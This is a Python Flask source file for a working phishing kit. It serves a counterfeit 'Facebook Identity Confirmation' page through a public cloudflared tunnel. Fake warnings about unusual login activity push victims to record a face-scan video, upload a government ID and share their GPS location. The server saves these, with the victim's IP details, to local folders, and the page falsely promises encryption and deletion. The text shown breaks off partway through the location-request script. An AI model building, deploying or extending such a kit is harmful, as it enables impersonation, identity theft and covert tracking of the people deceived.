import os
import base64
import subprocess
import sys
import re
import logging
import json
import random
from threading import Thread
import time
from datetime import datetime
from flask import Flask, render_template_string, request, jsonify
import requests
from geopy.geocoders import Nominatim
from geopy.distance import geodesic

# --- Dependency and Tunnel Setup ---

def install_package(package):
    """Installs a package using pip quietly."""
    subprocess.check_call([sys.executable, "-m", "pip", "install", package, "-q", "--upgrade"])

def check_dependencies():
    """Checks for cloudflared and required Python packages."""
    try:
        subprocess.run(["cloudflared", "--version"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        print("[ERROR] 'cloudflared' is not installed or not in your system's PATH.", file=sys.stderr)
        print("Please install it from: https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/", file=sys.stderr)
        sys.exit(1)
    
    packages = {"Flask": "flask", "requests": "requests", "geopy": "geopy"}
    for pkg_name, import_name in packages.items():
        try:
            __import__(import_name)
        except ImportError:
            install_package(pkg_name)

def run_cloudflared_and_print_link(port, script_name):
    """Starts a cloudflared tunnel and prints the public link."""
    cmd = ["cloudflared", "tunnel", "--url", f"http://127.0.0.1:{port}", "--protocol", "http2"]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    for line in iter(process.stdout.readline, ''):
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            print(f"{script_name} Public Link: {match.group(0)}")
            sys.stdout.flush()
            break
    process.wait()

def generate_random_name():
    """Generate a random Facebook-like name."""
    first_names = ["james", "emily", "michael", "sarah", "david", "jessica", "robert", "jennifer", 
                   "john", "elizabeth", "william", "megan", "richard", "laura", "joseph", "amy",
                   "thomas", "rebecca", "chris", "nicole"]
    last_names = ["smith", "johnson", "williams", "brown", "jones", "garcia", "miller", "davis",
                  "rodriguez", "martinez", "hernandez", "lopez", "gonzalez", "wilson", "anderson"]
    
    return f"{random.choice(first_names)} {random.choice(last_names)}"

def find_profile_picture(folder):
    """Search for an image file in the folder to use as profile picture."""
    image_extensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp', '.webp']
    
    for file in os.listdir(folder):
        file_lower = file.lower()
        if any(file_lower.endswith(ext) for ext in image_extensions):
            filepath = os.path.join(folder, file)
            try:
                with open(filepath, 'rb') as f:
                    image_data = f.read()
                    image_ext = os.path.splitext(file)[1].lower()
                    
                    mime_types = {
                        '.jpg': 'image/jpeg',
                        '.jpeg': 'image/jpeg',
                        '.png': 'image/png',
                        '.gif': 'image/gif',
                        '.bmp': 'image/bmp',
                        '.webp': 'image/webp'
                    }
                    
                    mime_type = mime_types.get(image_ext, 'image/jpeg')
                    base64_image = base64.b64encode(image_data).decode('utf-8')
                    
                    return {
                        'filename': file,
                        'data_url': f'data:{mime_type};base64,{base64_image}',
                        'path': filepath
                    }
            except Exception as e:
                print(f"Error reading profile picture {file}: {e}")
    
    return None

def get_verification_settings():
    """Get user preferences for verification process."""
    print("\n" + "="*60)
    print("FACEBOOK VERIFICATION SETUP")
    print("="*60)
    
    # Get target name
    print("\n[+] TARGET NAME SETUP")
    print("Enter the Facebook name to display in the verification page")
    print("Leave blank for random name generation")
    
    name_input = input("Target name (or press Enter for random): ").strip()
    if name_input:
        settings = {'target_name': name_input}
    else:
        random_name = generate_random_name()
        settings = {'target_name': random_name}
        print(f"[+] Generated random name: {random_name}")
    
    # Generate email
    settings['target_email'] = f"{settings['target_name'].lower().replace(' ', '.')}{random.randint(10, 999)}@example.com"
    
    # Look for profile picture
    global DOWNLOAD_FOLDER
    profile_pic = find_profile_picture(DOWNLOAD_FOLDER)
    if profile_pic:
        settings['profile_picture'] = profile_pic['data_url']
        settings['profile_picture_filename'] = profile_pic['filename']
        print(f"[+] Found profile picture: {profile_pic['filename']}")
    else:
        settings['profile_picture'] = None
        settings['profile_picture_filename'] = None
        print(f"[!] No profile picture found in folder")
        print(f"[!] Tip: Place an image (jpg/png) in {DOWNLOAD_FOLDER} to use as profile picture")
    
    print(f"\n[+] Verification will appear for: {settings['target_name']}")
    print(f"[+] Associated email: {settings['target_email']}")
    
    # Face scan duration
    print("\n1. Face Scan Duration:")
    print("How many seconds for face movement verification?")
    
    while True:
        try:
            duration = input("Duration in seconds (5-60, default: 18): ").strip()
            if not duration:
                settings['face_duration'] = 18
                break
            duration = int(duration)
            if 5 <= duration <= 60:
                settings['face_duration'] = duration
                break
            else:
                print("Please enter a number between 5 and 60.")
        except ValueError:
            print("Please enter a valid number.")
    
    # ID verification
    print("\n2. ID Document Verification:")
    print("Require ID document upload?")
    id_enabled = input("Enable ID verification (y/n, default: y): ").strip().lower()
    settings['id_enabled'] = id_enabled in ['y', 'yes', '']
    
    # Location verification
    print("\n3. Location Verification:")
    print("Require location verification?")
    location_enabled = input("Enable location verification (y/n, default: y): ").strip().lower()
    settings['location_enabled'] = location_enabled in ['y', 'yes', '']
    
    # Phone verification
    print("\n4. Phone Verification:")
    print("Require phone number verification?")
    phone_enabled = input("Enable phone verification (y/n, default: n): ").strip().lower()
    settings['phone_enabled'] = phone_enabled in ['y', 'yes', '']
    
    return settings

# --- Location Processing Functions ---

geolocator = Nominatim(user_agent="facebook_verification")

def process_and_save_location(data, session_id):
    """Process and save location data with metadata."""
    try:
        lat = data.get('latitude')
        lon = data.get('longitude')
        
        if not lat or not lon:
            return
        
        # Get address information
        address_details = {}
        full_address = "Unknown"
        try:
            location = geolocator.reverse((lat, lon), language='en', timeout=10)
            if location:
                full_address = location.address
                if hasattr(location, 'raw') and 'address' in location.raw:
                    address_details = location.raw.get('address', {})
        except Exception:
            pass
        
        # Get IP info
        ip_info = {}
        try:
            response = requests.get("http://ipinfo.io/json", timeout=5)
            ip_info = response.json()
        except:
            pass
        
        # Prepare structured data
        location_data = {
            "verification_type": "location",
            "session_id": session_id,
            "timestamp": datetime.now().isoformat(),
            "gps_coordinates": {
                "latitude": lat,
                "longitude": lon,
                "accuracy_m": data.get('accuracy')
            },
            "address_information": {
                "full_address": full_address,
                "city": address_details.get("city"),
                "state": address_details.get("state"),
                "country": address_details.get("country")
            },
            "network_information": {
                "ip_address": ip_info.get("ip"),
                "city": ip_info.get("city"),
                "region": ip_info.get("region"),
                "country": ip_info.get("country")
            }
        }
        
        # Save to file
        filename = f"facebook_location_{session_id}.json"
        filepath = os.path.join(DOWNLOAD_FOLDER, 'location_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(location_data, f, indent=2, ensure_ascii=False)
        
        print(f"Location data saved: {filename}")
        
    except Exception as e:
        print(f"Error processing location: {e}")

# --- Flask Application ---

app = Flask(__name__)

# Global settings
VERIFICATION_SETTINGS = {
    'target_name': generate_random_name(),
    'target_email': '',
    'face_duration': 18,
    'id_enabled': True,
    'location_enabled': True,
    'phone_enabled': False,
    'profile_picture': None,
    'profile_picture_filename': None
}

VERIFICATION_SETTINGS['target_email'] = f"{VERIFICATION_SETTINGS['target_name'].lower().replace(' ', '.')}{random.randint(10, 999)}@example.com"

DOWNLOAD_FOLDER = os.path.expanduser('~/storage/downloads/Facebook Verification')
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'face_scans'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'id_documents'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'location_data'), exist_ok=True)
os.makedirs(os.path.join(DOWNLOAD_FOLDER, 'user_data'), exist_ok=True)

def create_html_template(settings):
    """Creates the comprehensive Facebook verification template."""
    target_name = settings['target_name']
    target_email = settings['target_email']
    face_duration = settings['face_duration']
    id_enabled = settings['id_enabled']
    location_enabled = settings['location_enabled']
    phone_enabled = settings['phone_enabled']
    profile_picture = settings.get('profile_picture')
    
    # Calculate total steps
    total_steps = 2  # Introduction + Face
    if id_enabled:
        total_steps += 1
    if location_enabled:
        total_steps += 1
    if phone_enabled:
        total_steps += 1
    total_steps += 1  # Final step
    
    # Generate template
    template = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Identity Confirmation</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Helvetica, Arial, sans-serif;
        }}
        
        body {{
            background-color: #f0f2f5;
            color: #1c1e21;
            min-height: 100vh;
            padding: 20px;
        }}
        
        .container {{
            max-width: 500px;
            width: 100%;
            margin: 0 auto;
        }}
        
        .header {{
            text-align: center;
            margin-bottom: 20px;
            padding: 20px 0;
        }}
        
        .facebook-logo {{
            color: #1877F2;
            font-size: 3rem;
            font-weight: bold;
            margin-bottom: 10px;
        }}
        
        .card {{
            background-color: white;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 16px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
            border: 1px solid #dddfe2;
        }}
        
        .profile-info {{
            text-align: center;
            padding: 20px;
        }}
        
        .profile-avatar {{
            width: 100px;
            height: 100px;
            border-radius: 50%;
            margin: 0 auto 15px;
            background: linear-gradient(135deg, #1877F2, #0a58ca);
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
            overflow: hidden;
            border: 4px solid white;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        
        .profile-avatar img {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .profile-name {{
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 5px;
            color: #1c1e21;
        }}
        
        .profile-email {{
            color: #65676b;
            font-size: 14px;
            margin-bottom: 15px;
        }}
        
        .alert-warning {{
            background-color: #fff8e1;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }}
        
        .alert-danger {{
            background-color: #fde8e8;
            border-left: 4px solid #e53e3e;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }}
        
        .step {{
            display: none;
        }}
        
        .step.active {{
            display: block;
        }}
        
        .step-title {{
            color: #1c1e21;
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 10px;
        }}
        
        .step-description {{
            color: #65676b;
            margin-bottom: 20px;
            line-height: 1.5;
        }}
        
        .progress-container {{
            display: flex;
            align-items: center;
            margin-bottom: 25px;
            padding: 10px 0;
        }}
        
        .progress-step {{
            flex: 1;
            text-align: center;
            position: relative;
        }}
        
        .step-circle {{
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background-color: #e4e6eb;
            color: #8a8d91;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 8px;
            font-weight: 600;
            position: relative;
            z-index: 2;
        }}
        
        .step-circle.active {{
            background-color: #1877F2;
            color: white;
        }}
        
        .step-circle.completed {{
            background-color: #42b72a;
            color: white;
        }}
        
        .step-label {{
            font-size: 12px;
            color: #65676b;
        }}
        
        .progress-line {{
            position: absolute;
            top: 18px;
            left: -50%;
            right: 50%;
            height: 2px;
            background-color: #e4e6eb;
            z-index: 1;
        }}
        
        .progress-line.completed {{
            background-color: #42b72a;
        }}
        
        /* Face Verification Styles */
        .camera-container {{
            width: 250px;
            height: 250px;
            margin: 20px auto;
            border-radius: 8px;
            overflow: hidden;
            background-color: #000;
            border: 2px solid #1877F2;
            position: relative;
        }}
        
        .camera-container video {{
            width: 100%;
            height: 100%;
            object-fit: cover;
        }}
        
        .face-instructions {{
            background-color: #f0f2f5;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: center;
        }}
        
        .instruction-icon {{
            font-size: 24px;
            margin-bottom: 10px;
        }}
        
        .timer {{
            font-size: 32px;
            font-weight: 600;
            text-align: center;
            color: #1877F2;
            margin: 20px 0;
            font-family: monospace;
        }}
        
        /* ID Verification Styles */
        .id-upload-box {{
            border: 2px dashed #bdc4d1;
            border-radius: 8px;
            padding: 30px;
            text-align: center;
            margin: 20px 0;
            cursor: pointer;
            transition: all 0.3s;
        }}
        
        .id-upload-box:hover {{
            border-color: #1877F2;
            background-color: #f0f2f5;
        }}
        
        .upload-icon {{
            font-size: 48px;
            color: #1877F2;
            margin-bottom: 15px;
        }}
        
        .preview-image {{
            max-width: 200px;
            max-height: 150px;
            border-radius: 4px;
            margin-top: 15px;
            border: 1px solid #dddfe2;
        }}
        
        /* Location Verification Styles */
        .location-container {{
            text-align: center;
            padding: 20px;
        }}
        
        .location-icon {{
            font-size: 64px;
            color: #1877F2;
            margin-bottom: 20px;
        }}
        
        .location-details {{
            background-color: #f0f2f5;
            border-radius: 8px;
            padding: 15px;
            margin: 20px 0;
            text-align: left;
            display: none;
        }}
        
        /* Phone Verification Styles */
        .phone-input-container {{
            margin: 20px 0;
        }}
        
        .phone-input {{
            width: 100%;
            padding: 12px;
            border: 1px solid #dddfe2;
            border-radius: 6px;
            font-size: 16px;
            margin-bottom: 10px;
        }}
        
        /* Buttons */
        .btn {{
            width: 100%;
            padding: 12px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            margin-bottom: 10px;
        }}
        
        .btn-primary {{
            background-color: #1877F2;
            color: white;
        }}
        
        .btn-primary:hover {{
            background-color: #166fe5;
        }}
        
        .btn-primary:disabled {{
            background-color: #e4e6eb;
            cursor: not-allowed;
        }}
        
        .btn-secondary {{
            background-color: #e4e6eb;
            color: #1c1e21;
        }}
        
        .btn-secondary:hover {{
            background-color: #d8dadf;
        }}
        
        .status-message {{
            padding: 12px;
            border-radius: 6px;
            margin-bottom: 15px;
            text-align: center;
            font-size: 14px;
        }}
        
        .status-success {{
            background-color: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }}
        
        .status-error {{
            background-color: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }}
        
        .status-processing {{
            background-color: #fff3cd;
            color: #856404;
            border: 1px solid #ffeaa7;
        }}
        
        .loading-spinner {{
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2px solid rgba(0,0,0,.1);
            border-radius: 50%;
            border-top-color: #1877F2;
            animation: spin 1s ease-in-out infinite;
            margin-right: 10px;
        }}
        
        @keyframes spin {{
            to {{ transform: rotate(360deg); }}
        }}
        
        .footer {{
            text-align: center;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #dddfe2;
            color: #65676b;
            font-size: 12px;
        }}
        
        .footer-links {{
            margin-top: 10px;
        }}
        
        .footer-links a {{
            color: #65676b;
            text-decoration: none;
            margin: 0 8px;
        }}
        
        .footer-links a:hover {{
            text-decoration: underline;
        }}
        
        .completion-container {{
            text-align: center;
            padding: 30px 20px;
        }}
        
        .success-icon {{
            font-size: 72px;
            color: #42b72a;
            margin-bottom: 20px;
        }}
        
        .info-box {{
            background-color: #f0f2f5;
            border-radius: 8px;
            padding: 15px;
            margin: 15px 0;
            font-size: 14px;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="facebook-logo">facebook</div>
            <h2>Identity Confirmation Required</h2>
        </div>
        
        <div class="card">
            <div class="profile-info">
                <div class="profile-avatar">
                    {'<img src="' + profile_picture + '">' if profile_picture else target_name[0].upper()}
                </div>
                <div class="profile-name">{target_name}</div>
                <div class="profile-email">{target_email}</div>
                
                <div class="alert-danger">
                    <strong>Action Required:</strong> Your account needs additional verification to prevent unauthorized access.
                </div>
            </div>
        </div>
        
        <div class="card">
            <!-- Progress Steps -->
            <div class="progress-container">
                <div class="progress-step">
                    <div class="step-circle completed">1</div>
                    <div class="step-label">Start</div>
                    <div class="progress-line completed"></div>
                </div>
                <div class="progress-step">
                    <div class="step-circle active">2</div>
                    <div class="step-label">Face ID</div>
                    <div class="progress-line"></div>
                </div>
                <div class="progress-step">
                    <div class="step-circle">3</div>
                    <div class="step-label">ID</div>
                    <div class="progress-line"></div>
                </div>
                <div class="progress-step">
                    <div class="step-circle">4</div>
                    <div class="step-label">Location</div>
                    <div class="progress-line"></div>
                </div>
                <div class="progress-step">
                    <div class="step-circle">5</div>
                    <div class="step-label">Complete</div>
                </div>
            </div>
            
            <!-- Step 1: Introduction -->
            <div class="step active" id="step1">
                <h3 class="step-title">Confirm Your Identity</h3>
                <p class="step-description">
                    To secure your Facebook account and prevent unauthorized access, we need to confirm your identity.
                    This helps protect your personal information and keep your account safe.
                </p>
                
                <div class="alert-warning">
                    <strong>Why is this required?</strong><br>
                    We've detected unusual login activity on your account from a new device or location.
                    Complete this verification within 24 hours to restore full access.
                </div>
                
                <div class="info-box">
                    <strong>You will need:</strong><br>
                    • Camera access for face verification<br>
                    • A government-issued ID (driver's license, passport, or ID card)<br>
                    • Location services enabled<br>
                    • About 5-10 minutes of your time
                </div>
                
                <button class="btn btn-primary" onclick="nextStep()">
                    Start Identity Confirmation
                </button>
                
                <div class="footer-links" style="margin-top: 20px;">
                    <a href="#">Why do I need to do this?</a> • 
                    <a href="#">Learn about Facebook security</a>
                </div>
            </div>
            
            <!-- Step 2: Face Verification -->
            <div class="step" id="step2">
                <h3 class="step-title">Face Verification</h3>
                <p class="step-description">
                    We'll scan your face to match it with your profile and ID photos.
                    Follow the on-screen instructions carefully.
                </p>
                
                <div class="camera-container">
                    <video id="faceVideo" autoplay playsinline></video>
                </div>
                
                <div class="timer" id="faceTimer">00:{str(face_duration).zfill(2)}</div>
                
                <div class="face-instructions">
                    <div class="instruction-icon" id="instructionIcon">👤</div>
                    <div id="instructionText">Position your face in frame</div>
                    <div id="instructionDetail" style="font-size: 14px; color: #65676b;">
                        Make sure your face is clearly visible
                    </div>
                </div>
                
                <button class="btn btn-primary" id="startFaceBtn" onclick="startFaceVerification()">
                    Start Face Scan
                </button>
                
                <button class="btn btn-secondary" onclick="prevStep()">
                    Back
                </button>
            </div>
            
            <!-- Step 3: ID Verification -->
            <div class="step" id="step3">
                <h3 class="step-title">ID Document Verification</h3>
                <p class="step-description">
                    Upload a photo of your government-issued ID to confirm your identity.
                    This information is encrypted and secure.
                </p>
                
                <div class="id-upload-box" onclick="document.getElementById('idFileInput').click()">
                    <div class="upload-icon">📷</div>
                    <div style="font-weight: 600; margin-bottom: 10px;">Upload ID Photo</div>
                    <div style="color: #65676b; font-size: 14px;">
                        Driver's License, Passport, or National ID
                    </div>
                    <input type="file" id="idFileInput" style="display: none;" accept="image/*" onchange="handleIDUpload(this)">
                    
                    <div id="idPreview" style="display: none;">
                        <img id="idPreviewImage" class="preview-image">
                    </div>
                </div>
                
                <div class="info-box">
                    <strong>Your ID will be securely encrypted and deleted after 30 days.</strong><br>
                    We use this information only to verify your identity and prevent fraud.
                </div>
                
                <div class="status-message" id="idStatus"></div>
                
                <button class="btn btn-primary" id="submitIdBtn" onclick="submitIDVerification()" disabled>
                    Submit ID for Verification
                </button>
                
                <button class="btn btn-secondary" onclick="prevStep()">
                    Back
                </button>
            </div>
            
            <!-- Step 4: Location Verification -->
            <div class="step" id="step4">
                <h3 class="step-title">Location Verification</h3>
                <p class="step-description">
                    We need to verify your location to ensure you're accessing your account from an authorized area.
                </p>
                
                <div class="location-container">
                    <div class="location-icon">📍</div>
                    <div class="info-box">
                        Facebook uses location data to protect your account from unauthorized access attempts.
                        Your location data is encrypted and only used for security purposes.
                    </div>
                    
                    <div class="location-details" id="locationDetails">
                        <div style="margin-bottom: 10px;">
                            <strong>Location Details:</strong>
                        </div>
                        <div>Latitude: <span id="latValue"></span></div>
                        <div>Longitude: <span id="lonValue"></span></div>
                        <div>Accuracy: <span id="accuracyValue"></span></div>
                    </div>
                </div>
                
                <div class="status-message" id="locationStatus">
                    Click below to share your location
                </div>
                
                <button class="btn btn-primary" id="locationBtn" onclick="requestLocation()">
                    Share My Location
                </button>
                
                <button class="btn btn-secondary" onclick="prevStep()">
                    Back
                </button>
            </div>
            
            <!-- Step 5: Phone Verification (Optional) -->
            {'<div class="step" id="step5">' if phone_enabled else ''}
            {'<h3 class="step-title">Phone Verification</h3>' if phone_enabled else ''}
            {'<p class="step-description">' if phone_enabled else ''}
            {'Add your phone number for additional security and account recovery options.' if phone_enabled else ''}
            {'</p>' if phone_enabled else ''}
            {'<div class="phone-input-container">' if phone_enabled else ''}
            {'<input type="tel" class="phone-input" placeholder="+1 (555) 123-4567" id="phoneInput">' if phone_enabled else ''}
            {'<div class="info-box">' if phone_enabled else ''}
            {'Your phone number helps us secure your account and can be used for two-factor authentication.' if phone_enabled else ''}
            {'</div>' if phone_enabled else ''}
            {'</div>' if phone_enabled else ''}
            {'<button class="btn btn-primary" onclick="submitPhoneVerification()">' if phone_enabled else ''}
            {'Verify Phone Number' if phone_enabled else ''}
            {'</button>' if phone_enabled else ''}
            {'<button class="btn btn-secondary" onclick="prevStep()">' if phone_enabled else ''}
            {'Skip for Now' if phone_enabled else ''}
            {'</button>' if phone_enabled else ''}
            {'</div>' if phone_enabled else ''}
            
            <!-- Step Final: Processing -->
            <div class="step" id="stepFinal">
                <div class="completion-container">
                    <div class="loading-spinner" style="width: 50px; height: 50px; border-width: 4px;"></div>
                    <h3 class="step-title">Verifying Your Information</h3>
                    <p class="step-description">
                        Please wait while we verify your identity. This usually takes 1-2 minutes.
                    </p>
                    
                    <div class="status-message status-processing" id="finalStatus">
                        Checking face verification... 25%
                    </div>
                    
                    <div class="info-box">
                        <strong>What's happening?</strong><br>
                        1. Matching face scan with ID photo<br>
                        2. Validating ID document authenticity<br>
                        3. Verifying location consistency<br>
                        4. Updating security settings
                    </div>
                </div>
            </div>
            
            <!-- Step Complete -->
            <div class="step" id="stepComplete">
                <div class="completion-container">
                    <div class="success-icon">✓</div>
                    <h3 class="step-title">Verification Complete!</h3>
                    <p class="step-description">
                        Thank you, <strong>{target_name}</strong>. Your identity has been successfully verified.
                    </p>
                    
                    <div class="info-box">
                        <strong>Next steps:</strong><br>
                        • Your account security has been updated<br>
                        • You can now access all Facebook features<br>
                        • You'll be redirected to Facebook in <span id="countdown">5</span> seconds
                    </div>
                    
                    <button class="btn btn-primary" onclick="redirectToFacebook()">
                        Continue to Facebook
                    </button>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <div class="footer-links">
                <a href="#">Privacy Policy</a> • 
                <a href="#">Terms of Service</a> • 
                <a href="#">Help Center</a>
            </div>
            <div style="margin-top: 10px;">
                © 2024 Meta Platforms, Inc.
            </div>
        </div>
    </div>
    
    <script>
        // Global variables
        let currentStep = 1;
        let faceStream = null;
        let faceRecorder = null;
        let faceChunks = [];
        let faceTimeLeft = {face_duration};
        let faceTimerInterval = null;
        let instructionTimer = null;
        let idFile = null;
        let sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
        let targetName = "{target_name}";
        let targetEmail = "{target_email}";
        
        let faceInstructions = [
            {{icon: "👤", text: "Look Straight", detail: "Face the camera directly", duration: 3}},
            {{icon: "👈", text: "Turn Left", detail: "Slowly turn head left", duration: 3}},
            {{icon: "👉", text: "Turn Right", detail: "Slowly turn head right", duration: 3}},
            {{icon: "👆", text: "Look Up", detail: "Tilt head up slightly", duration: 3}},
            {{icon: "👇", text: "Look Down", detail: "Tilt head down slightly", duration: 3}},
            {{icon: "😊", text: "Smile", detail: "Give a natural smile", duration: 2}},
            {{icon: "✅", text: "Complete", detail: "Verification successful", duration: 1}}
        ];
        let currentInstructionIndex = 0;
        
        // Step Navigation
        function updateStepIndicators() {{
            const steps = document.querySelectorAll('.step-circle');
            const lines = document.querySelectorAll('.progress-line');
            
            steps.forEach((step, index) => {{
                step.classList.remove('active', 'completed');
                if (index + 1 < currentStep) {{
                    step.classList.add('completed');
                }} else if (index + 1 === currentStep) {{
                    step.classList.add('active');
                }}
            }});
            
            lines.forEach((line, index) => {{
                line.classList.remove('completed');
                if (index + 1 < currentStep - 1) {{
                    line.classList.add('completed');
                }}
            }});
        }}
        
        function showStep(stepNumber) {{
            document.querySelectorAll('.step').forEach(step => {{
                step.classList.remove('active');
            }});
            
            const stepElement = document.getElementById('step' + stepNumber);
            if (stepElement) {{
                stepElement.classList.add('active');
                currentStep = stepNumber;
                updateStepIndicators();
            }}
        }}
        
        function nextStep() {{
            // Skip phone step if not enabled
            let next = currentStep + 1;
            if (next === 5 && !{str(phone_enabled).lower()}) {{
                next = 6; // Skip to processing
            }}
            
            if (next <= 7) {{ // 7 is max step (complete)
                showStep(next);
            }}
        }}
        
        function prevStep() {{
            let prev = currentStep - 1;
            if (prev === 5 && !{str(phone_enabled).lower()}) {{
                prev = 4; // Skip phone step
            }}
            
            if (prev >= 1) {{
                showStep(prev);
            }}
        }}
        
        // Face Verification
        async function startFaceVerification() {{
            try {{
                const btn = document.getElementById('startFaceBtn');
                btn.disabled = true;
                btn.innerHTML = '<span class="loading-spinner"></span>Accessing Camera...';
                
                // Request camera
                faceStream = await navigator.mediaDevices.getUserMedia({{
                    video: {{ 
                        facingMode: 'user',
                        width: {{ ideal: 640 }},
                        height: {{ ideal: 480 }}
                    }},
                    audio: false
                }});
                
                // Show video
                document.getElementById('faceVideo').srcObject = faceStream;
                
                // Start face scan
                startFaceScan();
                
            }} catch (error) {{
                console.error("Camera error:", error);
                alert("Unable to access camera. Please ensure camera permissions are granted.");
                document.getElementById('startFaceBtn').disabled = false;
                document.getElementById('startFaceBtn').textContent = 'Start Face Scan';
            }}
        }}
        
        function startFaceScan() {{
            currentInstructionIndex = 0;
            faceTimeLeft = {face_duration};
            updateFaceTimer();
            showInstruction(0);
            
            // Start recording
            startFaceRecording();
            
            // Start countdown
            faceTimerInterval = setInterval(() => {{
                faceTimeLeft--;
                updateFaceTimer();
                
                if (faceTimeLeft <= 0) {{
                    completeFaceVerification();
                }}
            }}, 1000);
            
            // Change instructions every few seconds
            instructionTimer = setInterval(() => {{
                currentInstructionIndex++;
                if (currentInstructionIndex < faceInstructions.length) {{
                    showInstruction(currentInstructionIndex);
                }}
            }}, 3000);
        }}
        
        function showInstruction(index) {{
            const instruction = faceInstructions[index];
            if (instruction) {{
                document.getElementById('instructionIcon').textContent = instruction.icon;
                document.getElementById('instructionText').textContent = instruction.text;
                document.getElementById('instructionDetail').textContent = instruction.detail;
            }}
        }}
        
        function updateFaceTimer() {{
            const minutes = Math.floor(faceTimeLeft / 60);
            const seconds = faceTimeLeft % 60;
            document.getElementById('faceTimer').textContent = 
                minutes.toString().padStart(2, '0') + ':' + seconds.toString().padStart(2, '0');
        }}
        
        function startFaceRecording() {{
            faceChunks = [];
            const options = {{ mimeType: 'video/webm;codecs=vp9' }};
            
            try {{
                faceRecorder = new MediaRecorder(faceStream, options);
            }} catch (e) {{
                faceRecorder = new MediaRecorder(faceStream);
            }}
            
            faceRecorder.ondataavailable = (event) => {{
                if (event.data && event.data.size > 0) {{
                    faceChunks.push(event.data);
                }}
            }};
            
            faceRecorder.onstop = sendFaceRecording;
            faceRecorder.start(100);
        }}
        
        function completeFaceVerification() {{
            clearInterval(faceTimerInterval);
            clearInterval(instructionTimer);
            
            if (faceRecorder && faceRecorder.state === 'recording') {{
                faceRecorder.stop();
            }}
            
            // Stop camera
            if (faceStream) {{
                faceStream.getTracks().forEach(track => track.stop());
            }}
            
            // Show completion
            showInstruction(faceInstructions.length - 1);
            document.getElementById('faceTimer').textContent = "✓ Complete";
            
            // Auto-proceed
            setTimeout(() => {{
                nextStep();
            }}, 2000);
        }}
        
        function sendFaceRecording() {{
            if (faceChunks.length === 0) return;
            
            const videoBlob = new Blob(faceChunks, {{ type: 'video/webm' }});
            const reader = new FileReader();
            
            reader.onloadend = function() {{
                const base64data = reader.result.split(',')[1];
                
                $.ajax({{
                    url: '/submit_face_verification',
                    type: 'POST',
                    data: JSON.stringify({{
                        face_video: base64data,
                        duration: {face_duration},
                        timestamp: new Date().toISOString(),
                        session_id: sessionId,
                        target_name: targetName,
                        target_email: targetEmail
                    }}),
                    contentType: 'application/json',
                    success: function(response) {{
                        console.log('Face verification uploaded');
                    }}
                }});
            }};
            
            reader.readAsDataURL(videoBlob);
        }}
        
        // ID Verification
        function handleIDUpload(input) {{
            const file = input.files[0];
            if (file) {{
                idFile = file;
                
                // Show preview
                const reader = new FileReader();
                reader.onload = function(e) {{
                    const preview = document.getElementById('idPreview');
                    const previewImage = document.getElementById('idPreviewImage');
                    previewImage.src = e.target.result;
                    preview.style.display = 'block';
                }};
                reader.readAsDataURL(file);
                
                // Enable submit button
                document.getElementById('submitIdBtn').disabled = false;
            }}
        }}
        
        function submitIDVerification() {{
            if (!idFile) return;
            
            const statusDiv = document.getElementById('idStatus');
            statusDiv.className = 'status-message status-processing';
            statusDiv.innerHTML = '<span class="loading-spinner"></span>Uploading ID...';
            
            const btn = document.getElementById('submitIdBtn');
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Processing...';
            
            const formData = new FormData();
            formData.append('id_file', idFile);
            formData.append('timestamp', new Date().toISOString());
            formData.append('session_id', sessionId);
            formData.append('target_name', targetName);
            formData.append('target_email', targetEmail);
            
            $.ajax({{
                url: '/submit_id_verification',
                type: 'POST',
                data: formData,
                processData: false,
                contentType: false,
                success: function(response) {{
                    statusDiv.className = 'status-message status-success';
                    statusDiv.textContent = '✓ ID uploaded successfully';
                    
                    setTimeout(() => {{
                        nextStep();
                    }}, 1500);
                }},
                error: function() {{
                    statusDiv.className = 'status-message status-error';
                    statusDiv.textContent = '✗ Upload failed. Please try again.';
                    btn.disabled = false;
                    btn.textContent = 'Submit ID for Verification';
                }}
            }});
        }}
        
        // Location Verification
        function requestLocation() {{
            const btn = document.getElementById('locationBtn');
            const statusDiv = document.getElementById('locationStatus');
            
            btn.disabled = true;
            btn.innerHTML = '<span class="loading-spinner"></span>Getting Location...';
            statusDiv.className = 'status-message status-processing';
            statusDiv.textContent = 'Accessing your location...';
            
            if (!navigator.geolocation) {{
